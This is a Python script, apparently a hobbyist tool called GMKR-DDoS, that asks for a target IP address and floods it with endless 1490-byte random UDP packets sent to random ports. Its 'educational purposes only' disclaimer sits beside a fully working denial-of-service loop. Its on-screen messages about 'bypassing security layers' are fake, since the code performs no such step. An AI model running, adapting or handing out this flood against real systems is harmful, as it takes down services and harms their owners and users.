import os
import sys
import time
import socket
import random
from colorama import Fore, Style, init
from datetime import datetime

# Initialize colorama
init(autoreset=True)

# Socket Setup
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
payload = random._urandom(1490)

# Clear terminal
os.system("cls" if os.name == "nt" else "clear")

# Print Banner
os.system("figlet GMKR-DDoS")
print(f"{Fore.CYAN}Created By : Shaid Mahamud")
print(f"{Fore.CYAN}Author     : shaid69")
print(f"{Fore.CYAN}GitHub     : github.com/shid69")
print(f"{Fore.YELLOW}Note: This tool is for educational purposes only. Use at your own risk.")
print()

# Get Target IP
ip = input(f"{Fore.GREEN}Enter Target IP Address: ")

# Clear screen and show attack preparation
os.system("cls" if os.name == "nt" else "clear")
os.system("figlet GMKR-DDoS")
print(f"{Fore.MAGENTA}Team : GAMKERS")
print(Fore.LIGHTGREEN_EX + "_" * 60)

# Loading animation for connection setup
loading_messages = [
    f"{Fore.YELLOW}[*] Trying to reach the server...",
    f"{Fore.YELLOW}[*] Establishing connection...",
    f"{Fore.YELLOW}[*] Bypassing security layers...",
    f"{Fore.GREEN}[✓] Connection established. Preparing attack..."
]

for message in loading_messages:
    print(message)
    time.sleep(2)

# Attack starting message
print(f"{Fore.RED}Starting DDoS Attack... (Educational Purposes Only)")
time.sleep(2)

# Display progress bar for visual feedback
def progress_bar(sent, total):
    progress = int((sent / total) * 100)
    bar = f"[{'#' * (progress // 2)}{' ' * (50 - progress // 2)}] {progress}%"
    return bar

# Start Sending Packets
sent = 0
try:
    print(f"{Fore.GREEN}[*] Attack started. Press Ctrl+C to stop the attack.\n")
    while True:
        # Send packet to random port (1-65535)
        sock.sendto(payload, (ip, random.randint(1, 65535)))
        sent += 1
        
        # Display progress bar every 100 packets
        if sent % 100 == 0:
            print(f"{Fore.CYAN}Sent {sent} packets: {progress_bar(sent, 100000)}")
        
        # Optional: Display random port used for the packet
        # print(f"{Fore.CYAN}Sent packet to {ip} through random port.")

except KeyboardInterrupt:
    print(f"\n{Fore.RED}[!] Attack interrupted by user. Exiting...")
    sys.exit(0)
except Exception as e:
    print(f"{Fore.RED}[!] Error: {e}")
    sys.exit(1)
